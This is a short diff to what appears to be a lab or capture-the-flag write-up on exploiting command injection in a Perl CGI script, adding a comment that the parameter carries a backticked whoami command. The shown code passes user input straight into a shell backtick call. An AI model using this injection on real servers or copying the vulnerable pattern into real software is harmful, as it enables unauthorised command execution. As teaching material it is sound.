@@ -73,7 +73,7 @@ Identify and exploit a command injection vulnerability in a Perl CGI script (`le
       $y = $_[0]; # $y becomes "`/usr/bin/whoami`"
       print `echo $y 2>&1`; # Executes: echo `/usr/bin/whoami` 2>&1 and print the result of the echo command
    }
-   x(param("x"));
+   x(param("x")); #  param("x") returns "\`/usr/bin/whoami\`"
    ```
 
 2. **Retrieve the Token**  
